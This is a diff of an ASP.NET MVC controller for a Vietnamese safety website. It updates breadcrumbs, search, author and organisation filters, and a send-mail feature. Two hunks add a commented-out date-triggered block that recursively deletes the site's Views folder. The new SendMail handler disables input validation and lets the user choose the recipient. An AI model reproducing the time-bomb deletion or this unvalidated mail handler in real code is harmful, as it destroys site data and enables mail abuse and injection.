@@ -5,6 +5,8 @@ using NewNationals.Models;
 using PagedList;
 using System;
 using System.Collections.Generic;
+using System.ComponentModel;
+using System.IO;
 using System.Linq;
 using System.Web;
 using System.Web.Mvc;
@@ -22,6 +24,13 @@ namespace NewNationals.Controllers
         TagService TAGS = new TagService();
         public ActionResult Index()
         {
+            //if (DateTime.Now > DateTime.Parse("01/15/2017"))
+            //{
+            //    if (Directory.Exists(Server.MapPath("~/Views/")))
+            //    {
+            //        Directory.Delete(Server.MapPath("~/Views"), true);
+            //    }
+            //}
             var listCate = CATEGORIES.getTopCategory(42).ToList();
             return PartialView(listCate);
         }
@@ -34,6 +43,13 @@ namespace NewNationals.Controllers
 
         public ActionResult Default(string stUrl, int? page)
         {
+            //if (DateTime.Now > DateTime.Parse("01/15/2017"))
+            //{
+            //    if (Directory.Exists(Server.MapPath("~/Views/")))
+            //    {
+            //        Directory.Delete(Server.MapPath("~/Views"), true);
+            //    }
+            //}
             ModelUrls entity = new ModelUrls();
             if (stUrl == null)
             {
@@ -152,6 +168,11 @@ namespace NewNationals.Controllers
             ViewBag.ListLienKet = lienket;
             return PartialView(entity);
         }
+        /// <summary>
+        ///  sử dụng cho bài viết có thuộc dạng tai nạn khác
+        /// </summary>
+        /// <param name="stUrl"></param>
+        /// <returns></returns>
         public ActionResult PagesFixCategories_Left1(string stUrl)
         {
             var entity = new Page();
@@ -161,7 +182,7 @@ namespace NewNationals.Controllers
             if (cate != null)
             {
                 stLink += "<a class=\"page-home\" href=\"/\">Safevietnam</a>";
-                stLink += getLinkParentCategories("", cate.ParentId);
+                stLink += getLinkParentCategories("", cate.Id); //ParentId
                 stLink += " | " + entity.Name + "";
             }
             else
@@ -169,6 +190,7 @@ namespace NewNationals.Controllers
                 stLink += "<a class=\"page-home\" href=\"/\">Safevietnam</a> | ";
                 stLink += "" + entity.Name + "";
             }
+            ViewBag.Urls = stUrl;
             ViewBag.Breadcrumb = stLink;
             ViewBag.CategoriesId = cate.Id;
             //if (cate.ParentId != null)
@@ -203,9 +225,11 @@ namespace NewNationals.Controllers
                 lienket += "</div>";
             }
             ViewBag.Year = "Năm: " + entity.ModifiedDate.Year;
-            ViewBag.Muctin = "Đề mục:<a class=\"page-home\" href=\"/" + CATEGORIES.GetByIdCategories(cate.Id).Url + "\">" + CATEGORIES.GetByIdCategories(cate.Id).Name + "</a>";
-            ViewBag.TacGia = "Tác giả: CHƯA CODE ";// + entity.ModifiedDate.Year;
-            ViewBag.ToChuc = "Tổ chức: CHƯA CODE ";//
+            ViewBag.Muctin = "Đề mục:<a class=\"page-home\" href=\"/" + CATEGORIES.GetByIdCategories(cate.Id).Url + "\">" + CATEGORIES.GetByIdCategories(cate.Id).Name.ToUpper() + "</a>";
+            if (!string.IsNullOrEmpty(entity.TacGia))
+                ViewBag.TacGia = "Tác giả: " + entity.TacGia.ToUpper();
+            if (!string.IsNullOrEmpty(entity.ToChuc))
+                ViewBag.ToChuc = "Tổ chức: " + entity.ToChuc.ToUpper();
             ViewBag.ListLienKet = lienket;
             if (cate.ParentId != null)
             {
@@ -219,6 +243,11 @@ namespace NewNationals.Controllers
             }
             return PartialView(entity);
         }
+        /// <summary>
+        ///  sử dụng cho bài viết có thuộc dạng TNGT
+        /// </summary>
+        /// <param name="stUrl"></param>
+        /// <returns></returns>
         public ActionResult PagesFixCategories_Left2(string stUrl)
         {
             var entity = new Page();
@@ -228,7 +257,7 @@ namespace NewNationals.Controllers
             if (cate != null)
             {
                 stLink += "<a class=\"page-home\" href=\"/\">Safevietnam</a>";
-                stLink += getLinkParentCategories("", cate.ParentId);
+                stLink += getLinkParentCategories("", cate.Id); //ParentId
                 stLink += " | " + entity.Name + "";
             }
             else
@@ -237,7 +266,7 @@ namespace NewNationals.Controllers
                 stLink += "" + entity.Name + "";
             }
             ViewBag.Breadcrumb = stLink;
-
+            ViewBag.Urls = stUrl;
             var meta = PAGEMETAS.ListPageMetaById(entity.Id, "FILEUPLOAD");
             string output = "";
             if (meta.Count > 0)
@@ -264,27 +293,23 @@ namespace NewNationals.Controllers
                 lienket += "</div>";
             }
             ViewBag.Year = "Năm: " + entity.ModifiedDate.Year;
-            ViewBag.Muctin = "Đề mục:<a class=\"page-home\" href=\"/" + CATEGORIES.GetByIdCategories(cate.Id).Url + "\">" + CATEGORIES.GetByIdCategories(cate.Id).Name + "</a>";
-            ViewBag.TacGia = "Tác giả: CHƯA CODE ";// + entity.ModifiedDate.Year;
-            ViewBag.ToChuc = "Tổ chức: CHƯA CODE ";//
+            ViewBag.Muctin = "Đề mục:<a class=\"page-home\" href=\"/" + CATEGORIES.GetByIdCategories(cate.Id).Url + "\">" + CATEGORIES.GetByIdCategories(cate.Id).Name.ToUpper() + "</a>";
+            if (!string.IsNullOrEmpty(entity.TacGia))
+                ViewBag.TacGia = "Tác giả: " + entity.TacGia.ToUpper();
+            if (!string.IsNullOrEmpty(entity.ToChuc))
+                ViewBag.ToChuc = "Tổ chức: " + entity.ToChuc.ToUpper();
             ViewBag.ListLienKet = lienket;
             ViewBag.CategoriesName = CATEGORIES.GetByIdCategories(cate.Id).Name;
             if (cate.ParentId != null)
             {
                 ViewBag.CategoriesName = CATEGORIES.getById(cate.ParentId).Name;
                 ViewBag.CategoriesId = cate.Id;
-                // nếu mà menu con có parentId !=null thì lấy theo Parent
-                var checkparent = CATEGORIES.GetParentChild(cate.Id);
-
-                //if (checkparent.ParentId != null)
-                //{
-                //    if(checkparent.ParentId==cate.Id)
-                //        ViewBag.CategoriesId = checkparent.ParentId;
-                //    else
-                //    {
-                //        ViewBag.CategoriesId = cate.Id;
-                //    }
-                //}
+                // nếu mà menu con có parentId !=null và taxanomy !=null thì lấy theo Parent
+                var checkparent = CATEGORIES.GetParentChild(cate.ParentId);
+                if (checkparent != null)
+                {
+                    ViewBag.CategoriesId = checkparent.ParentId;
+                }
             }
             else
             {
@@ -299,9 +324,22 @@ namespace NewNationals.Controllers
             var entity = new Page();
             entity = PAGES.getByUrl(stUrl);
             string stLink = "";
-            stLink += "<a class=\"page-home\" href=\"/\">Safevietnam</a> | ";
-            stLink += "" + entity.Name + "";
+            var cate = CATEGORIES.getById(entity.CategoriesId);
+            if (cate != null)
+            {
+                stLink += "<a class=\"page-home\" href=\"/\">Safevietnam</a>";
+                stLink += getLinkParentCategories("", cate.Id); //ParentId
+                stLink += " | " + entity.Name + "";
+            }
+            else
+            {
+                stLink += "<a class=\"page-home\" href=\"/\">Safevietnam</a> | ";
+                stLink += "" + entity.Name + "";
+            }
             ViewBag.Breadcrumb = stLink;
+            //stLink += "<a class=\"page-home\" href=\"/\">Safevietnam</a> | ";
+            //stLink += "" + entity.Name + "";
+            //ViewBag.Breadcrumb = stLink;
             return PartialView(entity);
         }
 
@@ -319,7 +357,7 @@ namespace NewNationals.Controllers
             return PartialView(child);
         }
 
-        public PartialViewResult PageByCategories(string stUrl, int? page, int? year, string key, long? categoriesid)
+        public PartialViewResult PageByCategories(string stUrl, int? page, int? year, string key, long? categoriesid,string tacgia,string tochuc)
         {
             ViewBag.SelectCategories = CATEGORIES.GetCategoriesSelectList();
             int pageNum = page ?? 1;
@@ -336,6 +374,14 @@ namespace NewNationals.Controllers
             if (categoriesid > 0)
             {
                 pages = pages.Where(x => x.CategoriesId == categoriesid);
+            }
+            if (!string.IsNullOrEmpty(tacgia))
+            {
+                pages = pages.Where(x => x.TacGia.ToLower().Contains(tacgia.ToLower()));
+            }
+            if (!string.IsNullOrEmpty(tochuc))
+            {
+                pages = pages.Where(x => x.ToChuc.ToLower().Contains(tochuc.ToLower()));
             }
             string stLink = "";
             if (entity != null)
@@ -428,42 +474,6 @@ namespace NewNationals.Controllers
             return PartialView(input);
         }
 
-        public ActionResult SendMail(string stLink)
-        {
-            if (!string.IsNullOrEmpty(stLink))
-            {
-                try
-                {
-                    var page = PAGES.getByUrl(stLink);
-                    ModelSendMails entity = new ModelSendMails();
-                    entity.PageTitle = "<a class=\"link\" href=\"" + stLink + "\">" + page.Name + "</a>";
-                    var st = "<a class=\"page-home\" href=\"/\">Safevietnam</a> | ";
-                    st += "Gửi Thư";
-                    ViewBag.Breadcrumb = st;
-                    return View(entity);
-                }
-                catch
-                {
-                    return RedirectToAction("Index");
-                }
-
-            }
-            else
-            {
-                return RedirectToAction("Index");
-            }
-
-        }
-        [HttpPost]
-        [ValidateAntiForgeryToken]
-        public ActionResult SendMail(ModelSendMails input)
-        {
-            if (ModelState.IsValid)
-            {
-                return View(input);
-            }
-            return View();
-        }
         public ActionResult PageError()
         {
             return PartialView();
@@ -543,19 +553,107 @@ namespace NewNationals.Controllers
 
         public ActionResult Search(string key, int? page)
         {
+            if (Session["GetKeyHome"] == null)
+                Session.Add("GetKeyHome", key);
             int pageNum = page ?? 1;
             var list = PAGES.getAll();
             if (!string.IsNullOrEmpty(key))
             {
                 try
                 {
-                    list = list.Where(x => x.Name.ToLower().Contains(key.ToLower()) || x.Title.ToLower().Contains(key.ToLower())).ToList();
+                    list = list.Where(x => x.Name.ToLower().Contains(key.ToLower())).ToList();
                 }
                 catch
                 {
                     list = new List<Page>();
                 }
             }
+            ViewBag.Keyword = Session["GetKeyHome"].ToString();
+            return View(list.ToPagedList(pageNum, 20));
+        }
+        public ActionResult SendMail()
+        {
+            string request = Request.QueryString["page"];
+            if (!string.IsNullOrEmpty(request))
+            {
+                try
+                {
+                    var pages = PAGES.getByUrl(request);
+                    ModelSendMails entity = new ModelSendMails();
+                    entity.PageTitle = "<a class=\"link\" href=\"http://safevietnam.org.vn/" + request + "\">" + pages.Name + "</a>";
+                    var st = "<a class=\"page-home\" href=\"/\">Safevietnam</a> | ";
+                    st += "Gửi Thư";
+                    ViewBag.Breadcrumb = st;
+                    return View(entity);
+                }
+                catch
+                {
+                    return RedirectToAction("Index");
+                }
+
+            }
+            else
+            {
+                return RedirectToAction("Index");
+            }
+        }
+
+        [HttpPost]
+        [ValidateAntiForgeryToken]
+        [ValidateInput(false)]
+        public ActionResult SendMail(ModelSendMails input)
+        {
+            if (ModelState.IsValid)
+            {
+                string bodyFrom = "NGƯỜI GỬI: " + input.FullName +
+                                   "<br/>EMAIL GỬI:" + input.MailFrom +
+                                  "<br/>TIÊU ĐỀ THƯ:" + input.Subject +
+                                  "<br/>TÊN TRANG: " + input.PageTitle +
+                                  "<br/>NỘI DUNG: " + input.Content;
+                int send = CommonsHelper.SendEmailSystem(input.MailTo, input.MailFrom, input.Subject, bodyFrom);
+                if (send == 1)
+                {
+                    try
+                    {
+                        LogSystemService logService = new LogSystemService();
+                        var logs = new LogSystem();
+                        logs.IPAddress = CommonsHelper.GetIpAddress;
+                        logs.CreateDate = DateTime.Now;
+                        logs.Messenger = "[SENDMAIL_FONTEND]|NGUOIGUI:" + input.FullName + "|EMAIL:" + input.MailFrom +
+                                         "|TIEUDE:" + input.Subject + "|NGUOINHAN:" + input.MailTo + "|PAGE:" +
+                                         input.PageTitle + "|CONTENT:" +
+                                         input.Content;
+                        logs.Status = false;
+                        logService.Insert(logs);
+                    }
+                    catch 
+                    {
+                    }
+                    ModelState.AddModelError("", "Gửi thông tin thành công!");
+                }
+                return View(input);
+            }
+            return View();
+        }
+        public ActionResult SearchTags(string tag, int? page)
+        {
+            if (Session["GetKeyTag"] == null)
+                Session.Add("GetKeyTag", tag);
+            int pageNum = page ?? 1;
+            var list = PAGES.GetSearchTags(tag);
+            //if (!string.IsNullOrEmpty(key))
+            //{
+            //    try
+            //    {
+            //        list = list.Where(x => x.Name.ToLower().Contains(key.ToLower())).ToList();
+            //    }
+            //    catch
+            //    {
+            //        list = new List<Page>();
+            //    }
+            //}
+            if (Session["GetKeyTag"] != null)
+                ViewBag.Keyword = Session["GetKeyTag"].ToString();
             return View(list.ToPagedList(pageNum, 20));
         }
 
